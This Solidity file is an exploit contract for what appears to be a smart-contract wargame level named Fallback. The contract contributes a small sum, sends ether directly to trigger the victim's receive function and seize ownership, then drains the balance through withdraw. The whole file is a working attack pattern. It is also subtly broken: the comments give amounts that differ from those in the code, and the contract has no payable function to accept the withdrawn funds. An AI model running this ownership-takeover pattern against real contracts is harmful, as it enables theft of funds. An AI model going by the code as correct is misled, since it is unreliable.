// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Fallback.sol";
import "hardhat/console.sol";



contract FallbackExploit {

    Fallback public victimContract;
    address payable _targetAddress;

    constructor(address targetAddress) payable {
        victimContract = Fallback(payable(targetAddress));
        _targetAddress = payable(targetAddress);
    }

    function setup() external {
        // 1. contribute 0.002 ether
        victimContract.contribute{value: 0.0002 ether}();
    }

    function attack() external {
        // 2. transfer 0.001 ether to target to trigger receive function and become owner
        payable(address(victimContract)).call{value: 0.0002 ether}("");
    }

    function cashOut() external {
        // 3. Withdraw all funds
        victimContract.withdraw();
    }

    fallback() external {
        
    }

}